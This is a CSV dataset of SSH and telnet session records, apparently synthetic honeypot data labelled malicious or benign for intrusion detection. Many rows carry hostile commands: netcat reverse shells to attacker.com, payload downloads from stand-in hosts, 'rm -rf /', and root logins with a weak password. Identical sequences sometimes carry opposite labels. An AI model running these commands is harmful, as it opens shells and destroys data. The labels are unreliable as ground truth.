session,src_ip,protocol,duration,input_token_count,unique_commands,command_sequence,label
b7448888-5b48-4bcb-bd01-2a3e550420ae,81.144.163.24,telnet,409.47,6,3,cd /tmp; chmod +x script.sh; ./script.sh,1
29410c7a-7036-4f30-8826-472dddc69831,91.250.250.103,ssh,238.04,15,4,chmod +x payload.sh; echo 'pwned' > /tmp/x; nc -e /bin/sh attacker.com 4444; scp exploit.sh root@target:/tmp/,1
6e48c122-4a43-4934-a641-8b274550cfee,6.76.250.188,ssh,155.83,2,2,logout; uptime,0
04d31665-aa84-4677-8353-d831c4a6b7ef,153.228.138.2,telnet,40.77,18,4,curl -O http://badhost/exploit; echo 'pwned' > /tmp/x; echo 'pwned' > /tmp/x; nc -e /bin/sh attacker.com 4444; wget http://malicious.site/payload.sh,1
36711d2f-0b56-4638-b9ce-c38a60a87098,17.7.188.211,ssh,4.52,3,3,whoami; exit; logout,0
f1d49fb8-3a91-40be-9f2e-2565a88d7451,78.114.251.241,ssh,872.98,19,5,wget http://malicious.site/payload.sh; rm -rf /; sshpass -p '1234' ssh root@target; echo 'pwned' > /tmp/x; nc -e /bin/sh attacker.com 4444,1
13771920-639f-4ae8-ae9e-97949230f195,131.163.221.1,telnet,255.4,1,3,; pwd; ; ,0
f981e446-495b-469d-a155-202ccbac93f7,171.36.65.220,ssh,32.88,5,3,date; logout; nc attacker.com 4444,0
37d9b093-52d2-4763-b0af-bb9a07276b3c,119.197.49.32,ssh,511.39,27,5,chmod +x payload.sh; chmod +x payload.sh; echo 'pwned' > /tmp/x; curl -O http://badhost/exploit; echo 'pwned' > /tmp/x; nc -e /bin/sh attacker.com 4444; nc -e /bin/sh attacker.com 4444,1
6a72f2e1-76f3-403e-a111-2799ded27977,230.129.158.143,ssh,116.44,5,3,date; logout; nc attacker.com 4444,0
ambiguous-extra-26,10.1.0.26,ssh,326.655902,2,3,whoami; curl http://exploit; ls; pwd,1
f69973d9-5cea-43a3-a7a6-5135ba6bca36,200.166.66.159,ssh,197.92,14,5,chmod +x payload.sh; echo 'pwned' > /tmp/x; curl -O http://badhost/exploit; chmod +x payload.sh; ./payload.sh,1
85fe227b-0c02-4bd3-a54d-d1215876e8cc,218.46.61.75,ssh,506.41,23,7,rm -rf /; python -m http.server 8080; chmod +x payload.sh; curl -O http://badhost/exploit; wget http://malicious.site/payload.sh; scp exploit.sh root@target:/tmp/; nc -e /bin/sh attacker.com 4444,1
12cc4f90-b411-4679-bdd9-7cccdd7a301c,41.40.183.33,telnet,676.52,24,4,wget http://malicious.site/payload.sh; nc -e /bin/sh attacker.com 4444; scp exploit.sh root@target:/tmp/; nc -e /bin/sh attacker.com 4444; ./payload.sh; scp exploit.sh root@target:/tmp/; nc -e /bin/sh attacker.com 4444,1
cc70fef8-e830-4306-9508-64309e9c1931,160.152.252.49,ssh,215.58,6,3,cd /tmp; chmod +x script.sh; ./script.sh,1
134edc8e-7db5-44d5-9b3a-21627dc31ef1,38.92.35.239,ssh,74.33,1,2,; date,0
42370c44-5905-414f-8481-61aab6a646cc,174.100.94.241,ssh,151.62,3,3,logout; ; cd /home,0
idle-extra-65,192.168.100.65,ssh,915.3863454,0,0,,0
1c5165d3-8837-494f-a703-1e73d6b2c1cc,159.229.22.19,ssh,45.62,1,2,date; ,0
338fd5e2-8730-4960-8f76-9808adcb5c71,147.253.93.252,telnet,77.79,4,4,cd /home; ls; ; date,0
bb94137a-526a-4d09-b71c-8732213d37fb,161.73.239.155,ssh,408.02,20,5,echo 'pwned' > /tmp/x; scp exploit.sh root@target:/tmp/; nc -e /bin/sh attacker.com 4444; rm -rf /; sshpass -p '1234' ssh root@target,1
57ee3210-4a30-4a7c-b284-97451956ec78,113.141.5.204,ssh,66.01,3,3,whoami; pwd; pwd; ,0
743a349b-da87-4e73-94d7-ec08df24028e,157.163.187.182,ssh,111.54,3,4,uptime; ; uptime; logout,0
6c648d5c-1e58-42f5-9d96-670c405b94b1,115.44.180.145,telnet,88.23,16,5,chmod +x payload.sh; ./payload.sh; scp exploit.sh root@target:/tmp/; nc -e /bin/sh attacker.com 4444; echo 'pwned' > /tmp/x,1
549f513c-0565-45a5-be73-006c4dc69335,253.179.126.74,telnet,260.91,3,4,ls; whoami; exit; ,0
d31a276e-7ed9-4436-8f9b-3d0ab1e4cca8,213.170.102.170,ssh,256.73,16,5,curl -O http://badhost/exploit; scp exploit.sh root@target:/tmp/; curl -O http://badhost/exploit; wget http://malicious.site/payload.sh; nc -e /bin/sh attacker.com 4444,1
7e620db8-0998-4e7b-80ef-646b6a208211,24.187.121.60,ssh,872.21,21,6,wget http://malicious.site/payload.sh; sshpass -p '1234' ssh root@target; scp exploit.sh root@target:/tmp/; nc -e /bin/sh attacker.com 4444; wget http://malicious.site/payload.sh; python -m http.server 8080,1
6a9cd2c7-ccd3-44bd-b484-5642f1e94aba,132.25.246.141,ssh,223.06,2,3,exit; ; date; ,0
a0366bf2-a8ea-41e0-b746-1e90b181f75d,119.233.175.161,ssh,797.02,20,5,python -m http.server 8080; scp exploit.sh root@target:/tmp/; chmod +x payload.sh; rm -rf /; echo 'pwned' > /tmp/x; chmod +x payload.sh,1
dec1e16a-c6d2-463c-8d10-e31b7a17e607,30.250.161.248,ssh,232.48,4,3,cd /home; exit; uptime,0
ed405e00-04b1-43c1-8f54-22ef27c0e0e8,243.36.132.183,ssh,805.06,15,5,curl -O http://badhost/exploit; wget http://malicious.site/payload.sh; rm -rf /; curl -O http://badhost/exploit; echo 'pwned' > /tmp/x,1
59918ee9-242d-43b4-ae82-963b723c3619,54.152.63.109,ssh,429.34,25,7,nc -e /bin/sh attacker.com 4444; echo 'pwned' > /tmp/x; ./payload.sh; chmod +x payload.sh; scp exploit.sh root@target:/tmp/; sshpass -p '1234' ssh root@target; python -m http.server 8080,1
42541d43-bc69-4209-ae5d-8d3f21db78b8,181.26.148.70,ssh,27.01,20,3,echo 'pwned' > /tmp/x; python -m http.server 8080; python -m http.server 8080; echo 'pwned' > /tmp/x; python -m http.server 8080,1
scan-extra-5,172.20.0.5,telnet,0,0,0,,0
b84ac425-f995-4e21-9d4e-ac31d655cda9,231.124.192.156,ssh,282.73,2,4,; pwd; uptime; ,0
395aa909-d619-4953-8be1-5041368f7e2a,254.62.0.172,telnet,737.81,14,3,scp exploit.sh root@target:/tmp/; python -m http.server 8080; rm -rf /; python -m http.server 8080,1
ace2eeb9-0e48-405f-82a5-10a8f49fab88,96.2.8.137,ssh,122.57,2,3,date; uptime; ,0
8fbb6d53-3929-4d49-9501-c02967386ac5,33.165.181.40,telnet,607.52,21,6,./payload.sh; ./payload.sh; scp exploit.sh root@target:/tmp/; scp exploit.sh root@target:/tmp/; sshpass -p '1234' ssh root@target; chmod +x payload.sh; nc -e /bin/sh attacker.com 4444,1
0f354a74-eaa2-41c5-8446-8b7aee4dc17f,28.150.174.4,ssh,261.47,2,2,whoami; pwd,0
18fd6670-d05a-4d80-90a7-be15fb87a867,165.143.58.61,ssh,277.8,2,2,; cd /home,0
dffae0bb-1b97-445b-879f-58ac1a02c58f,40.24.188.159,ssh,171.37,0,2,; ,0
351768bc-a8e4-459b-bcac-8bfbc912036d,231.35.74.228,ssh,302.5,18,5,echo 'pwned' > /tmp/x; ./payload.sh; curl -O http://badhost/exploit; nc -e /bin/sh attacker.com 4444; python -m http.server 8080; ./payload.sh,1
047a6d02-de3d-4c8c-bb37-e1fd2249a932,96.161.171.224,ssh,676.41,5,3,pwd; echo test; wget http://suspicious.site/x,1
66a07624-72ae-4f7b-9af4-cd714830aef5,215.102.122.227,ssh,862.76,16,4,python -m http.server 8080; nc -e /bin/sh attacker.com 4444; wget http://malicious.site/payload.sh; chmod +x payload.sh; wget http://malicious.site/payload.sh,1
4a13361e-2b27-4e3f-a780-c5ce325668b0,31.98.88.176,ssh,121.87,3,4,; logout; uptime; whoami,0
4b1e99bf-462b-43db-8d7b-3a4c0f2bca02,127.181.97.53,ssh,77.73,6,3,cd /tmp; chmod +x script.sh; ./script.sh,1
7380fc70-5bc9-4ef2-b852-71b2b4db0203,69.30.108.77,ssh,274.16,22,5,wget http://malicious.site/payload.sh; python -m http.server 8080; python -m http.server 8080; rm -rf /; rm -rf /; curl -O http://badhost/exploit; chmod +x payload.sh,1
idle-extra-7,192.168.100.7,telnet,695.8260472,0,0,,0
ambiguous-extra-101,10.1.0.101,ssh,340.9495378,18,5,nc -e /bin/sh attacker.com; cd /; whoami; chmod +x payload.sh,0
scan-1,172.16.0.1,telnet,0,0,0,,0
3a86ae74-f4b0-4e85-bb30-692388d0df62,174.251.123.119,telnet,197.09,3,2,logout; date; date,0
0ad853ee-9188-420e-b2ed-d427df8375b5,3.211.185.83,ssh,129.18,25,6,nc -e /bin/sh attacker.com 4444; python -m http.server 8080; wget http://malicious.site/payload.sh; scp exploit.sh root@target:/tmp/; curl -O http://badhost/exploit; nc -e /bin/sh attacker.com 4444; curl -O http://badhost/exploit,1
fdc6cc29-4060-4724-8a61-86cb5f2cf72e,153.71.177.206,telnet,425.38,5,3,pwd; echo test; wget http://suspicious.site/x,1
fe0e6da2-b5c2-4011-a0f0-36ac11041829,118.180.226.170,ssh,828.83,18,3,sshpass -p '1234' ssh root@target; chmod +x payload.sh; sshpass -p '1234' ssh root@target; sshpass -p '1234' ssh root@target,1
1d299d90-584c-48ee-92a5-b774b4dad3a5,59.166.169.44,ssh,219.76,1,2,; ls,0
e4d33553-56d9-42ac-8850-8bae5db13f52,168.155.202.36,telnet,32.95,17,5,scp exploit.sh root@target:/tmp/; wget http://malicious.site/payload.sh; python -m http.server 8080; rm -rf /; nc -e /bin/sh attacker.com 4444,1
4b4342a8-6112-4713-b63e-719e0fac9e14,143.35.2.228,ssh,842.17,25,7,chmod +x payload.sh; rm -rf /; chmod +x payload.sh; scp exploit.sh root@target:/tmp/; python -m http.server 8080; echo 'pwned' > /tmp/x; nc -e /bin/sh attacker.com 4444,1
idle-extra-34,192.168.100.34,ssh,1062.039574,0,0,,0
bf053895-94ed-4695-a4ac-087186e0c24a,6.33.207.129,ssh,706.75,25,6,chmod +x payload.sh; chmod +x payload.sh; rm -rf /; rm -rf /; python -m http.server 8080; nc -e /bin/sh attacker.com 4444; echo 'pwned' > /tmp/x,1
6c3dcb60-b49f-40e6-859c-a7a5bea68225,198.216.22.162,telnet,279.79,3,3,date; whoami; ls,0
6adcba8a-2665-4be6-bc72-8cfe3017b3d5,125.154.235.210,ssh,230.02,2,2,ls; exit,0
604b56b5-ef9d-42f8-bd13-b88b8df3c57b,192.170.112.100,ssh,20.04,1,3,; uptime; ,0
47df3094-0f6e-4501-be0c-6cf88d223a9b,37.69.246.160,ssh,293.28,14,3,rm -rf /; nc -e /bin/sh attacker.com 4444; ./payload.sh; nc -e /bin/sh attacker.com 4444,1
2483f41f-86f7-4f7a-80c5-263b8342f397,32.121.154.56,ssh,551.51,27,5,echo 'pwned' > /tmp/x; nc -e /bin/sh attacker.com 4444; sshpass -p '1234' ssh root@target; sshpass -p '1234' ssh root@target; python -m http.server 8080; wget http://malicious.site/payload.sh; wget http://malicious.site/payload.sh,1
1f390989-a2b2-461e-8355-7a05386019c3,164.219.187.128,ssh,567.9,25,6,echo 'pwned' > /tmp/x; rm -rf /; python -m http.server 8080; python -m http.server 8080; chmod +x payload.sh; sshpass -p '1234' ssh root@target; wget http://malicious.site/payload.sh,1
76ae9238-bfa1-4e51-992e-76d9cb879def,2.93.56.35,ssh,67.73,2,3,date; exit; ,0
b90007f0-b8a8-4d3c-be08-5501b74f13ad,202.22.127.96,ssh,408.68,12,3,curl -O http://badhost/exploit; wget http://malicious.site/payload.sh; nc -e /bin/sh attacker.com 4444; wget http://malicious.site/payload.sh,1
60dfc231-a917-4e06-8b1d-2cb14ac85f29,83.94.47.44,ssh,869.38,14,5,rm -rf /; nc -e /bin/sh attacker.com 4444; ./payload.sh; wget http://malicious.site/payload.sh; scp exploit.sh root@target:/tmp/,1
6b1e347a-0abb-45c5-b212-cc8c25a86cfe,198.141.146.47,ssh,229.22,4,3,exit; logout; logout; ls,0
a5b30c04-98b6-4bfc-9b0e-eaae1ce92f44,149.135.134.35,ssh,256.26,2,4,; ls; uptime; ,0
idle-extra-3,192.168.100.3,ssh,764.4342314,0,0,,0
4b6ee06d-c062-4342-b3a9-004b79bd8783,64.178.91.159,ssh,32.48,2,3,logout; ; date; ,0
41344c3a-6e72-4bb9-90d7-fa4a979e6f29,211.7.221.91,ssh,289.13,3,3,logout; ls; pwd,0
446e3940-7620-45a3-aaba-9de4f90f7f59,148.75.42.182,telnet,328.61,17,4,echo 'pwned' > /tmp/x; python -m http.server 8080; echo 'pwned' > /tmp/x; ./payload.sh; python -m http.server 8080,1
cd0b94af-6585-4ca3-b474-16971b4edb32,193.118.80.69,ssh,36,2,3,; logout; date,0
22a9b724-bb5d-4625-8ebe-8fac32f3b0ed,60.113.84.200,telnet,173.24,0,2,; ,0
df65a3ff-4784-4ee9-8f0a-5b2b40ab0483,120.8.188.25,ssh,167.2,2,3,whoami; exit; ,0
acec3e0b-937b-4666-85a0-88c7f7470c75,39.180.179.200,ssh,237.36,18,5,python -m http.server 8080; python -m http.server 8080; ./payload.sh; nc -e /bin/sh attacker.com 4444; echo 'pwned' > /tmp/x,1
af4fcdfd-1b12-48c0-a7d6-25133552daba,109.210.122.98,ssh,555.51,20,3,wget http://malicious.site/payload.sh; scp exploit.sh root@target:/tmp/; python -m http.server 8080; scp exploit.sh root@target:/tmp/; python -m http.server 8080; python -m http.server 8080,1
8462956d-d387-4102-98e6-72503d7f8452,7.66.32.65,ssh,337.47,15,5,curl -O http://badhost/exploit; nc -e /bin/sh attacker.com 4444; curl -O http://badhost/exploit; chmod +x payload.sh; ./payload.sh,1
9df52a17-49d5-4fe8-86e4-b33ef296e8bf,80.20.19.198,telnet,280.38,3,4,ls; ; pwd; whoami,0
04f6afdf-c431-4ffb-b318-8ee2e9dfc28c,229.70.161.223,telnet,884.71,24,6,chmod +x payload.sh; scp exploit.sh root@target:/tmp/; rm -rf /; ./payload.sh; sshpass -p '1234' ssh root@target; echo 'pwned' > /tmp/x; sshpass -p '1234' ssh root@target,1
928ea128-1e96-4d27-9365-690b3517b692,150.76.117.138,ssh,588.38,15,4,echo 'pwned' > /tmp/x; curl -O http://badhost/exploit; echo 'pwned' > /tmp/x; python -m http.server 8080,1
d8a49da3-9332-45da-b9df-ed5cb4117322,132.57.175.19,ssh,895.83,5,3,ls; whoami; curl -O http://badhost/file,1
97f5f4dc-43fe-4045-ab2d-06f19a862283,94.43.230.59,ssh,171.66,1,2,; logout,0
b15ceb9a-d983-4c2a-bb3c-145ba24605aa,151.243.14.39,ssh,98.16,0,2,; ; ,0
b727b307-10a1-41fd-b0c6-82c5f30898f5,64.113.122.209,telnet,262.69,3,2,cd /home; uptime,0
58f6bc3f-3206-488f-a67c-366b0c7991c4,234.233.11.22,ssh,173.6,2,4,; ; ls; date,0
dc61e660-ec9a-4037-897c-4a4594402c6f,193.194.77.62,ssh,108.09,2,3,; pwd; date,0
8a834c40-b7d8-458f-ab4b-7c58f5f44ccf,222.234.216.112,ssh,226.92,0,2,; ,0
2b08ae72-170e-40c3-a426-1c15f1b90ca3,170.164.2.26,ssh,171.64,3,3,exit; ls; uptime,0
928729e0-e217-44db-954c-660967c9d4e2,249.70.104.136,ssh,224.91,3,3,cd /home; logout; ; ,0
735a247f-562e-4416-a923-d735f7f1f150,66.213.237.162,telnet,140.08,1,3,; uptime; ,0
22e7d701-ed0d-4b91-acc7-adff886aac5c,148.49.152.26,telnet,285.28,2,3,ls; ; date,0
8adbcb20-04de-46e4-9a9a-385656c6c3c2,29.245.252.220,telnet,162.53,2,2,logout; exit,0
9c5b960c-3164-4fc5-a5fe-4662153ea5b1,21.219.54.102,telnet,69.85,5,3,ls; whoami; curl -O http://badhost/file,0
098f76d9-1372-4dfe-b69d-24cc6672037c,92.45.35.239,ssh,89.1,5,3,ls; whoami; curl -O http://badhost/file,0
7f984d15-a8b0-4b2b-b182-474053caf822,181.180.135.217,ssh,425.22,16,2,echo 'pwned' > /tmp/x; chmod +x payload.sh; chmod +x payload.sh; chmod +x payload.sh; chmod +x payload.sh,1
2e1bbd2a-8452-4533-88fd-c06f95d33773,21.38.199.140,ssh,873.24,23,3,nc -e /bin/sh attacker.com 4444; sshpass -p '1234' ssh root@target; sshpass -p '1234' ssh root@target; python -m http.server 8080; python -m http.server 8080,1
ed0f55da-7d70-47b0-a208-ef751bd5b6aa,195.239.133.101,ssh,431.37,23,5,curl -O http://badhost/exploit; python -m http.server 8080; nc -e /bin/sh attacker.com 4444; sshpass -p '1234' ssh root@target; rm -rf /; rm -rf /,1
84ffbee9-8d62-41f4-93d1-cf251f0cc182,236.115.36.234,ssh,182.01,5,3,ls; whoami; curl -O http://badhost/file,1
7b8d060b-fdd0-479f-9b49-193ac1570f69,52.14.188.207,ssh,554.46,21,6,rm -rf /; scp exploit.sh root@target:/tmp/; python -m http.server 8080; wget http://malicious.site/payload.sh; scp exploit.sh root@target:/tmp/; nc -e /bin/sh attacker.com 4444; ./payload.sh,1
62cd3ab4-dffe-44fd-8be4-0aab830c7ea2,176.10.112.194,ssh,49.43,3,2,cd /home; ls,0
f7588583-6fc0-471b-9ce6-f3eb8219546f,227.122.57.151,telnet,288.56,5,4,cd /home; exit; pwd; uptime,0
231f8458-993e-43c0-ad7e-c475b11a2982,121.232.224.147,ssh,217.63,2,2,whoami; date,0
2cafdc80-cd9f-448d-9709-eb6b38e7b0e0,205.247.67.28,ssh,14.2,19,6,chmod +x payload.sh; sshpass -p '1234' ssh root@target; chmod +x payload.sh; rm -rf /; echo 'pwned' > /tmp/x; ./payload.sh,1
c2823347-6278-4e83-a9d7-7425aa9b6475,255.88.118.209,ssh,163.26,5,3,date; logout; nc attacker.com 4444,0
27d08af5-87d4-41f3-abee-3c879296f71e,192.158.220.82,telnet,107.01,6,3,cd /tmp; chmod +x script.sh; ./script.sh,0
4faca604-e6ef-4f71-83b0-eec8466e77d0,219.195.173.42,telnet,8.69,1,2,pwd; ,0
ambiguous-29,10.0.0.29,ssh,53.65232631,8,3,date; nc -e /bin/sh attacker.com,1
027b9deb-0ba0-4f60-a4a3-aa3696182ed0,25.17.166.140,ssh,113.03,2,3,; date; whoami,0
f6e51a53-ed7e-4fd7-a161-e083cfdc4e2f,205.196.166.218,telnet,131.17,4,3,date; date; logout; date,0
4a2c89c1-0561-4e12-b84d-7e546ca65db4,126.135.66.68,ssh,717.72,21,6,./payload.sh; chmod +x payload.sh; curl -O http://badhost/exploit; sshpass -p '1234' ssh root@target; ./payload.sh; python -m http.server 8080; python -m http.server 8080,1
592da08a-098f-47ec-bee0-94f9c3f26968,107.62.154.22,ssh,569.51,19,4,curl -O http://badhost/exploit; sshpass -p '1234' ssh root@target; sshpass -p '1234' ssh root@target; scp exploit.sh root@target:/tmp/; chmod +x payload.sh,1
b628a0fd-9cc2-4481-acb9-7e8332e13216,109.233.191.50,telnet,10.97,22,6,curl -O http://badhost/exploit; sshpass -p '1234' ssh root@target; curl -O http://badhost/exploit; python -m http.server 8080; wget http://malicious.site/payload.sh; nc -e /bin/sh attacker.com 4444,1
5912af1e-bff4-4a0e-abdb-54bfdd990394,27.141.27.106,ssh,187.75,20,5,scp exploit.sh root@target:/tmp/; nc -e /bin/sh attacker.com 4444; curl -O http://badhost/exploit; curl -O http://badhost/exploit; rm -rf /; scp exploit.sh root@target:/tmp/,1
dfe4fc1e-d0ca-4c59-ace7-9e368e567890,181.199.149.53,ssh,139.4,19,5,echo 'pwned' > /tmp/x; rm -rf /; sshpass -p '1234' ssh root@target; chmod +x payload.sh; echo 'pwned' > /tmp/x,1
f903d0d2-15ea-4310-b381-657bff9c2f02,103.211.248.133,ssh,145.16,1,2,; pwd,0
dd5a8a7e-a466-4c1c-94ca-168691975fb5,73.230.186.136,ssh,641.47,18,5,wget http://malicious.site/payload.sh; wget http://malicious.site/payload.sh; curl -O http://badhost/exploit; echo 'pwned' > /tmp/x; sshpass -p '1234' ssh root@target; wget http://malicious.site/payload.sh,1
b28d66cb-b3c4-4c9a-b19c-60f888f78944,79.117.61.55,ssh,470.61,18,4,curl -O http://badhost/exploit; curl -O http://badhost/exploit; echo 'pwned' > /tmp/x; python -m http.server 8080; python -m http.server 8080,1
ambiguous-extra-128,10.1.0.128,ssh,370.7532997,5,4,date; curl http://exploit; chmod +x payload.sh; exit; cd /,1
ce8b7f7a-0440-4733-8c9b-536451edddf9,253.3.177.19,ssh,136.38,6,3,cd /tmp; chmod +x script.sh; ./script.sh,0
4dd003a2-9e33-4c9c-a87e-346d652db708,116.146.240.89,ssh,298.79,12,3,sshpass -p '1234' ssh root@target; ./payload.sh; ./payload.sh; sshpass -p '1234' ssh root@target,1
ambiguous-extra-127,10.1.0.127,ssh,360.7342377,5,3,nc -e /bin/sh attacker.com; date,0
8891b6af-5c1e-4e98-8a48-a8f7a0f4e94a,252.199.116.197,telnet,88.49,3,4,pwd; ; exit; whoami,0
768e4416-c74c-409d-a1df-53bef86387ae,203.97.251.105,ssh,871.32,23,6,rm -rf /; chmod +x payload.sh; curl -O http://badhost/exploit; chmod +x payload.sh; sshpass -p '1234' ssh root@target; ./payload.sh; nc -e /bin/sh attacker.com 4444,1
94062f8f-6092-4866-8553-9b787f509f13,189.142.177.146,ssh,177.84,13,3,echo 'pwned' > /tmp/x; curl -O http://badhost/exploit; curl -O http://badhost/exploit; chmod +x payload.sh,1
ambiguous-extra-63,10.1.0.63,ssh,89.70103267,2,3,curl http://exploit; date; ls; exit; chmod +x payload.sh,0
2b686884-96b1-4a55-b545-e5553a60f45b,36.139.52.217,ssh,198.52,4,4,exit; date; uptime; logout,0
bd6ed91f-6001-4510-9529-09038b3bfbd6,52.160.7.75,ssh,82.18,23,5,nc -e /bin/sh attacker.com 4444; scp exploit.sh root@target:/tmp/; chmod +x payload.sh; chmod +x payload.sh; echo 'pwned' > /tmp/x; nc -e /bin/sh attacker.com 4444,1
e60f027c-acc9-4381-ade6-551533d131ff,240.24.22.240,ssh,81.67,1,2,whoami; ; ,0
1c76771b-c9db-49f4-9a7e-ee3669718856,158.251.172.200,ssh,626.66,13,5,./payload.sh; sshpass -p '1234' ssh root@target; ./payload.sh; wget http://malicious.site/payload.sh; echo 'pwned' > /tmp/x,1
437faf4f-3cf0-4489-9a92-0398832f9b35,165.86.2.148,telnet,229.15,23,6,scp exploit.sh root@target:/tmp/; scp exploit.sh root@target:/tmp/; chmod +x payload.sh; scp exploit.sh root@target:/tmp/; rm -rf /; nc -e /bin/sh attacker.com 4444; curl -O http://badhost/exploit,1
2cc6c6ad-55b1-40a5-aa8a-9164a17cc4fe,175.75.179.79,ssh,628.7,15,3,chmod +x payload.sh; rm -rf /; rm -rf /; chmod +x payload.sh; rm -rf /,1
5b1842ec-ddde-4a3d-be63-5f179c82c6a7,112.146.224.56,ssh,40.08,2,2,uptime; exit,0
scan-extra-0,172.20.0.0,telnet,0,0,0,,0
scan-extra-45,172.20.0.45,telnet,0,0,0,,0
c020c1c2-bd5c-4c6b-acce-659795cc80d6,118.163.83.219,ssh,108.72,22,5,chmod +x payload.sh; ./payload.sh; nc -e /bin/sh attacker.com 4444; scp exploit.sh root@target:/tmp/; sshpass -p '1234' ssh root@target; nc -e /bin/sh attacker.com 4444,1
ec4a9c42-68af-4be2-8b1e-0c099398596d,52.183.5.205,telnet,387.39,15,5,rm -rf /; chmod +x payload.sh; python -m http.server 8080; scp exploit.sh root@target:/tmp/; wget http://malicious.site/payload.sh,1
9ade20f0-62ef-499c-b2ac-3dbd7a098c66,98.211.174.169,ssh,76.99,2,2,pwd; date,0
d9a23ed6-07d1-4480-b379-40cf3a46e0fd,120.224.13.160,telnet,294.56,2,2,date; ls,0
f077f139-d31e-4c7c-952e-100ea137092e,66.145.78.160,ssh,1.24,3,3,exit; date; whoami,0
95c4c3f9-b2d8-43f2-a8a0-93182699a0c8,7.144.16.71,telnet,77.22,13,4,chmod +x payload.sh; nc -e /bin/sh attacker.com 4444; wget http://malicious.site/payload.sh; rm -rf /,1
8a2a98d9-515f-440e-85a6-9b5b152261b3,131.120.4.180,ssh,219.81,1,2,whoami; ; ; ,0
ambiguous-15,10.0.0.15,telnet,111.5392641,3,4,pwd; chmod +x payload.sh,1
idle-extra-18,192.168.100.18,telnet,960.3652222,0,0,,0
idle-extra-73,192.168.100.73,ssh,993.3120977,0,0,,0
b6429033-75be-49e2-b58b-06fa5d9362e3,135.171.245.55,ssh,70.38,5,3,ls; whoami; curl -O http://badhost/file,0
180992c5-7cf7-42bf-b813-3227d066ffb8,33.175.112.246,ssh,123.78,4,3,uptime; cd /home; date,0
3ecffe3d-77f4-42ee-95a1-02a400c05f19,201.174.11.164,telnet,142.19,5,4,whoami; cd /home; logout; exit,0
3fd8323b-aba9-47f2-8e8b-5560ebf665b8,217.191.205.4,ssh,11.79,5,4,ls; cd /home; whoami; date,0
535a310d-352a-4947-adf3-96c635dd0c01,107.47.242.56,ssh,153.17,4,4,ls; exit; logout; ls,0
5f231177-fe7c-4b97-b731-577d16a062ad,223.0.74.162,ssh,619.81,12,4,scp exploit.sh root@target:/tmp/; wget http://malicious.site/payload.sh; python -m http.server 8080; curl -O http://badhost/exploit,1
1b748d37-6021-48f0-a1c8-e29dec3955a4,202.163.107.61,telnet,135.42,2,3,; date; logout,0
ambiguous-extra-72,10.1.0.72,ssh,443.7726356,11,4,wget http://bad.com; chmod +x payload.sh; whoami,0
c3236c41-9f46-41dd-ba8f-9b8a9480feee,107.119.229.209,telnet,529.28,21,6,nc -e /bin/sh attacker.com 4444; wget http://malicious.site/payload.sh; ./payload.sh; sshpass -p '1234' ssh root@target; echo 'pwned' > /tmp/x; python -m http.server 8080,1
5e905bfa-9bd5-4b74-8290-e01a68ddcb02,217.243.115.89,ssh,267.89,6,3,cd /tmp; chmod +x script.sh; ./script.sh,0
64e4d2b5-f445-4a6c-92b6-c1a991299b88,153.171.2.71,telnet,407.24,9,3,python -m http.server 8080; chmod +x payload.sh; ./payload.sh; ./payload.sh,1
85a6b751-2f60-44df-a4f0-60baf0c931d1,6.187.139.153,ssh,151.02,5,3,date; logout; nc attacker.com 4444,1
92c4c149-e366-44b2-9a57-b3baeb83e478,153.49.71.181,ssh,127.41,2,2,date; whoami,0
idle-extra-83,192.168.100.83,telnet,1075.711574,0,0,,0
f1a8d45e-fdbf-4dc6-8436-dc45d828e1b2,47.162.246.215,telnet,2.85,1,3,; ; whoami; ,0
93974c6e-1224-4a36-a697-5d059ab30f66,127.252.15.31,ssh,285.94,5,3,date; logout; nc attacker.com 4444,1
c385ecd2-bd93-455b-8061-9fd218808fab,97.41.87.204,ssh,8.68,1,2,uptime; ,0
7da5da4b-b2cc-46f9-9d16-a34a78f577f9,43.96.159.214,telnet,99.89,3,3,; cd /home; exit,0
